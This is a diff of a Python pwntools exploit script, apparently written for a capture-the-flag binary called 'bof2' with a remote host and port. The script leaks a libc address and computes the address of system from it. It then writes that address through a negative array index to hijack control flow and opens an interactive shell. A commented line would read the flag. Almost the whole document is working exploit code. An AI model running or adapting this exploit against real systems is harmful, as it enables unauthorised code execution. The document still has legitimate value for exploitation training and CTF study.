@@ -2,22 +2,18 @@ from pwn import *
 import base64
 import binascii
 
-
 host = "124.244.16.209"
 port = 8002
-
 #libc = ELF('libc.so.6')
 #/lib/x86_64-linux-gnu/libc-2.24.so
 
 libc = ELF('libc-2.24.so')
 
-
 #r = remote(host,port)
 
 r=process('./bof2')
 
-sleep(20)
-
+#sleep(20)
 
 def dump(i):
 
@@ -79,21 +75,19 @@ write_c=long(write_c,16)
 #write 0000000000601020 -64
 #libc main 600FF0 -14
 
-
 one_time=0x04647c
 print write_c
 
 execc=0x0B8A7F
 
 
-#libc_base=write_c-libc.symbols["scanf"]
+libc_base=write_c-libc.symbols["scanf"]
 #exit as main
 #sys=0x4006db
 
 sys=libc_base+libc.symbols["system"]
 
-sys=libc_base+execc
-
+#sys=libc_base+execc
 
 r.recvuntil('Input:\n')
 r.sendline('2')
@@ -101,7 +95,6 @@ r.recvuntil(']:\n')
 r.sendline('-6')
 r.recvuntil(']:\n')
 r.sendline(p64(sys)[:7])
-
 
 r.recvuntil('Input:\n')
 r.sendline('2')
@@ -118,8 +111,4 @@ r.sendline(payload)
 #payload='cat /home/bof2/flag'
 
 #r.sendline(payload)
-
-
-
-
 r.interactive()
